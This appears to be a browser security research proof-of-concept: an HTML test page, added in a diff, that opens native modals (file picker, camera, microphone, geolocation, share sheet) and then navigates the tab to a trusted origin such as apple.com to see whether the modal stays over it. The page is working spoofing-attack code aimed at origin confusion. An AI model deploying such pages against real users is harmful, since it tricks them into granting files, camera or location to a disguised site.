@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Axis A — modal-over-trusted-origin sweep</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; max-width: 620px; margin: 0 auto;
+           padding: 1rem 1rem calc(1rem + env(safe-area-inset-bottom)); line-height: 1.5; }
+    h1 { font-size: 1.25rem; }
+    p { font-size: .92rem; }
+    fieldset { margin: 1rem 0; border: 1px solid #ccc; border-radius: 8px; padding: .6rem 1rem; }
+    legend { font-weight: 600; font-size: .85rem; }
+    label { display: block; padding: .5rem .3rem; font-size: 1rem; border-radius: 6px; }
+    label:active { background: #eee; }
+    input[type=radio] { transform: scale(1.25); margin-right: .55rem; vertical-align: middle; }
+    .row { margin: .8rem 0; }
+    .row input[type=url], .row input[type=number] {
+      width: 100%; padding: .7rem; font-size: 1rem; border: 1px solid #bbb; border-radius: 8px; }
+    button { display: block; width: 100%; margin: .8rem 0; padding: 1rem; font-size: 1.05rem;
+             font-weight: 600; color: #fff; background: #2563eb; border: none; border-radius: 10px; }
+    button.prime { background: #16a34a; }
+    #log { white-space: pre-wrap; word-break: break-word; background: #111; color: #0f0;
+           padding: 1rem; border-radius: 8px; min-height: 4rem; font-family: ui-monospace, Menlo, monospace;
+           font-size: .82rem; margin-top: .8rem; }
+    #support { font-size: .78rem; color: #666; }
+  </style>
+</head>
+<body>
+  <h1>Axis A — strand a native modal over a trusted origin</h1>
+  <p>
+    Each run invokes the chosen native modal, then navigates this same tab to
+    the trusted origin while the modal is up. Watch whether the modal stays
+    presented over the trusted site (address bar shows the trusted origin).
+    The origin must already hold pop-up permission — use "Prime" first.
+    Benign: results shown locally only, nothing is transmitted.
+  </p>
+  <div id="support"></div>
+
+  <button class="prime" id="prime">1 · Prime pop-up permission (tap Allow)</button>
+
+  <fieldset>
+    <legend>2 · Which native modal to strand</legend>
+    <label><input type="radio" name="modal" value="file" checked> &lt;input type=file&gt; picker</label>
+    <label><input type="radio" name="modal" value="camera"> &lt;input capture=camera&gt;</label>
+    <label><input type="radio" name="modal" value="gum-video"> getUserMedia camera (live + permission prompt)</label>
+    <label><input type="radio" name="modal" value="gum-audio"> getUserMedia microphone</label>
+    <label><input type="radio" name="modal" value="geo"> Geolocation permission prompt</label>
+    <label><input type="radio" name="modal" value="share"> navigator.share (share sheet)</label>
+    <label><input type="radio" name="modal" value="print"> window.print (print sheet)</label>
+    <label><input type="radio" name="modal" value="datepicker"> date input showPicker()</label>
+  </fieldset>
+
+  <div class="row">
+    <label for="url">Trusted URL to navigate to:</label>
+    <input id="url" type="url" value="https://apple.com" inputmode="url" autocapitalize="off" autocorrect="off">
+  </div>
+  <div class="row">
+    <label for="delay">Navigate after (seconds):</label>
+    <input id="delay" type="number" min="0" step="0.5" value="3">
+  </div>
+
+  <button id="go">3 · Run test</button>
+
+  <!-- hidden inputs used by some modal types -->
+  <input id="fileInput" type="file" style="position:absolute;left:-9999px" aria-hidden="true">
+  <input id="dateInput" type="date" style="position:absolute;left:-9999px" aria-hidden="true">
+  <div id="log">waiting…</div>
+
+  <script>
+    const logEl = document.getElementById('log');
+    const log = (m) => { logEl.textContent += '\n' + m; };
+    const modal = () => document.querySelector('input[name=modal]:checked').value;
+    const trusted = () => document.getElementById('url').value;
+    const delayMs = () => Math.max(0, parseFloat(document.getElementById('delay').value) || 0) * 1000;
+
+    (function () {
+      const has = (o, k) => (o && k in o) ? 'yes' : 'no';
+      document.getElementById('support').textContent =
+        'secureContext: ' + window.isSecureContext +
+        ' | getUserMedia: ' + has(navigator.mediaDevices || {}, 'getUserMedia') +
+        ' | geolocation: ' + has(navigator, 'geolocation') +
+        ' | share: ' + has(navigator, 'share') +
+        ' | showPicker: ' + (('showPicker' in HTMLInputElement.prototype) ? 'yes' : 'no') +
+        '  (getUserMedia/share need HTTPS + a user gesture)';
+    })();
+
+    // Prime: earn the pop-up permission for this origin.
+    document.getElementById('prime').onclick = () => {
+      const w = window.open('about:blank', '_blank');
+      if (w) { try { w.close(); } catch (e) {} log('primed: pop-up permission likely granted.'); }
+      else { log('pop-up was blocked — tap Allow if prompted, then run again.'); }
+    };
+
+    function invokeModal() {
+      const m = modal();
+      if (m === 'file' || m === 'camera') {
+        const inp = document.getElementById('fileInput');
+        inp.value = '';
+        if (m === 'camera') { inp.setAttribute('accept','image/*'); inp.setAttribute('capture','camera'); }
+        else { inp.setAttribute('accept','image/*'); inp.removeAttribute('capture'); }
+        inp.onchange = () => log('file received by THIS origin: ' + (inp.files[0] && inp.files[0].name));
+        inp.click();
+        return 'file picker opened';
+      }
+      if (m === 'gum-video' || m === 'gum-audio') {
+        const c = m === 'gum-video' ? { video: true } : { audio: true };
+        log('requesting ' + (m === 'gum-video' ? 'camera' : 'microphone') + '… (watch which origin the prompt shows)');
+        navigator.mediaDevices.getUserMedia(c)
+          .then(s => { log('STREAM GRANTED to THIS origin'); try { s.getTracks().forEach(t => t.stop()); } catch(e){} })
+          .catch(e => log('getUserMedia: ' + e.name));
+        return 'permission prompt requested';
+      }
+      if (m === 'geo') {
+        log('requesting geolocation… (watch which origin the prompt shows)');
+        navigator.geolocation.getCurrentPosition(
+          p => log('LOCATION GRANTED to THIS origin: ' + p.coords.latitude.toFixed(2) + ',' + p.coords.longitude.toFixed(2)),
+          e => log('geolocation: ' + e.message));
+        return 'permission prompt requested';
+      }
+      if (m === 'share') {
+        if (!navigator.share) { log('navigator.share not supported here'); return 'unsupported'; }
+        navigator.share({ title: 'Upload', text: 'Uploading to Apple', url: trusted() })
+          .then(() => log('shared')).catch(e => log('share: ' + e.name));
+        return 'share sheet opened';
+      }
+      if (m === 'print') { window.print(); return 'print sheet opened'; }
+      if (m === 'datepicker') {
+        const d = document.getElementById('dateInput');
+        if (d.showPicker) { d.showPicker(); return 'date picker opened'; }
+        log('showPicker not supported here'); return 'unsupported';
+      }
+    }
+
+    document.getElementById('go').onclick = () => {
+      logEl.textContent = 'run: ' + modal();
+      try {
+        const status = invokeModal();               // open the native modal
+        log(status + '; navigating to ' + trusted() + ' in ' + (delayMs()/1000) + 's');
+        setTimeout(() => { window.location.href = trusted(); }, delayMs());  // strand it over trusted origin
+      } catch (e) {
+        log('error: ' + (e && e.name) + ' — ' + (e && e.message));
+      }
+    };
+  </script>
+</body>
+</html>
